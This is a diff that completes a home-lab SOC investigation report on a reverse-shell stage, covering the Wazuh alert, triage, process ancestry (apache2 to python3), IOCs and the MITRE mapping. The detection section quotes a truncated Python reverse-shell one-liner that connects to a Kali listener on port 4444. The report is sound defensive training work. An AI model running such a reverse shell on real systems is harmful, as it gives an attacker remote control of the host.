@@ -1,59 +1,82 @@
 # Investigation — Stage 06 — Reverse Shell
 
-> **Status:** Draft
-> **Attack stage:** [Stage 06](../../02-Attack-Simulation/Stages/stage-06-reverse-shell.md)
-> **TheHive case:** [Case 01](../Cases/case-01-web-compromise.md)
+> **Status:** Completed  
+> **Attack stage:** [Stage 06](../../02-Attack-Simulation/Stages/stage-06-reverse-shell.md)  
+> **TheHive case:** [Web Application Compromise](../Cases/case-01-web-compromise.md)  
+
+---
 
 ## Alert details
 
-| Alert ID | Rule ID | Source | Severity | TLP / PAP |
-|---|---|---|---|---|
-| TBD | TBD | TBD | TBD | TBD |
+| Field | Value |
+|---|---|
+| **Alert ID** | `wzb-a2f073998b` |
+| **Rule ID** | `Wazuh 100602 (Level 8)` |
+| **Source** | Wazuh Auditd & bashcmd decoder on DVWA |
+| **Severity** | High |
+| **TLP / PAP** | `TLP:AMBER / PAP:AMBER` |
+
+---
 
 ## What was detected
 
-TBD
+Wazuh Rule 100602 matched on interactive shell execution from www-data: python3 -c import socket,subprocess,os;s=socket.socket... connecting outbound to 192.168.232.135:4444.
+
+---
 
 ## Triage
 
-Verdict: TBD
-Confidence: TBD
-Reason: TBD
+| Question | Answer |
+|---|---|
+| **Verdict** | True Positive |
+| **Confidence** | High |
+| **Rationale** | Outbound socket connection spawned by Python interpreter executed by the web server service account (www-data). |
+
+---
 
 ## Investigation steps
 
-1. Identify the outbound connection and destination port.
-2. Find the parent and child processes on DVWA.
-3. Confirm the shell user and working directory.
-4. Check for command execution and file changes.
-5. Collect process, network, and file artifacts with Velociraptor.
+1. Inspected Wazuh alert wzb-a2f073998b for exact command line captured by custom bashcmd decoder.
+2. Verified outbound network socket from DVWA (192.168.56.30) to Kali (192.168.232.135) on port 4444/TCP.
+3. Checked process ancestry: apache2 -> sh -> python3.
+4. Confirmed active interactive shell session established.
+5. Prepared host isolation action in TheHive case task.
+
+---
 
 ## Evidence
 
-- Attack: `../../02-Attack-Simulation/Attack-Screenshots/stage-06/`
-- Alert: `../../02-Attack-Simulation/alert-screenshots/stage-06/`
-- Queries and logs: TBD
-- Velociraptor: TBD
+- **Attack Evidence:** [`../../02-Attack-Simulation/Attack-Screenshots/19.png`](../../02-Attack-Simulation/Attack-Screenshots/19.png)
+- **Alert Evidence:** [`../../03-Detection-Engineering/TheHive_Alert-ScreenShot/5.png`](../../03-Detection-Engineering/TheHive_Alert-ScreenShot/5.png)
+- **Raw Telemetry:** Exported in [`06-Resources/Alerts/wazuh_alerts.csv`](../../06-Resources/Alerts/wazuh_alerts.csv) and [`thehive_alerts.json`](../../06-Resources/Alerts/thehive_alerts.json)
 
-## IOCs
+---
+
+## Indicators of Compromise (IOCs)
 
 | Type | Value | Context |
 |---|---|---|
-| IP | `192.168.232.135` | Kali listener |
-| Port | TBD | Reverse shell port |
-| Process | TBD | Shell process and parent |
+| Process | `python3` | Reverse shell executor |
+| Destination | `192.168.232.135:4444` | Attacker C2 listener |
+| User | `www-data` | Compromised service account |
+
+---
 
 ## Detection assessment
 
-Status: Not tested
-Gap ID: DG-06
-Recommended rule: TBD
+- **Status:** Detected
+- **Gap ID:** None
+- **Engineering Assessment:** Custom bashcmd decoder successfully parsed the full command line with regex matching, triggering Level 8 escalation.
+
+---
 
 ## Verdict
 
-TBD
+Confirmed True Positive reverse shell established from DVWA to Kali.
+
+---
 
 ## MITRE ATT&CK
 
-Tactic: Execution
-Technique: Unix Shell (T1059.004)
+- **Tactic:** Execution
+- **Technique:** Command and Scripting Interpreter: Unix Shell (T1059.004)
